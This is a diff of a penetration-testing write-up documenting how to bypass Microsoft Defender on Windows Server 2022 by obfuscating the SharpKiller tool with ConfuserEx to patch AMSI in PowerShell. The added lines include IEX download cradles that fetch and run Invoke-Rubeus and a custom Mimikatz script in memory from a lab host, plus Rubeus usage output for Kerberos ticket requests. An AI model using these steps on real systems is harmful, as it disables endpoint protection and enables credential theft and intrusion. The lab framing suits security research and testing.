@@ -1,5 +1,5 @@
 ===================================================================================================================================================
-AV bypass using the tool 'Sharp-Killer'
+AV bypass using the tool 'SharpKiller'
 ===================================================================================================================================================
 
 Sharp-Killer
@@ -18,7 +18,7 @@ PoC - Test on a Windows 2022 server protected by the Microsoft Defender Antiviru
 ===================================================================================================================================================
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
-Step 1 - Compile the tool "Sharp-Killer" and then obfuscated it (I used the packer "ConfuserEx")
+Step 1 - Compile the tool "SharpKiller" and then obfuscated it (I used the packer "ConfuserEx")
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
 => Source code:  https://github.com/S1lkys/SharpKiller
@@ -99,7 +99,7 @@ This script contains malicious content and has been blocked by your antivirus so
 
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
-Step 3 - Download and execute the packed version of "Sharp-Killer" to successfully patch the AMSI.dll in all open PowerShell sessions
+Step 3 - Download and execute the packed version of "SharpKiller" to successfully patch the AMSI.dll in all open PowerShell sessions
          on the Windows server 2022.
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -130,11 +130,39 @@ At line:1 char:1
 
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
-Step 4 - Download and execute straight in-memory any PowerShell offensive security scripts or C# offensive security assemblies
-         without being blocked by the Windows Defender AV 
+Step 4 - Download and execute straight in-memory any PowerShell HackTool scripts and C# offensive security assemblies 
+         without being detected and blocked by the Windows Defender AV 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
-=> We can now download and execute straight in-memory any malicious scripts and tools such as the hacking tool 'Mimikatz' for this PoC.
+PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('https://192.168.1.144/Invoke-Rubeus.ps1');
+
+PS C:\Users\Administrator> invoke-rubeus
+cmdlet Invoke-Rubeus at command pipeline position 1
+Supply values for the following parameters:
+Command: help
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+ Ticket requests and renewals:
+
+    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] 
+	    [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
+	    [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]
+
+    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe 
+	    [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
+	    [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]
+
+<SNIP>
 
 PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/Invoke-Mimi-Custom.ps1');
 
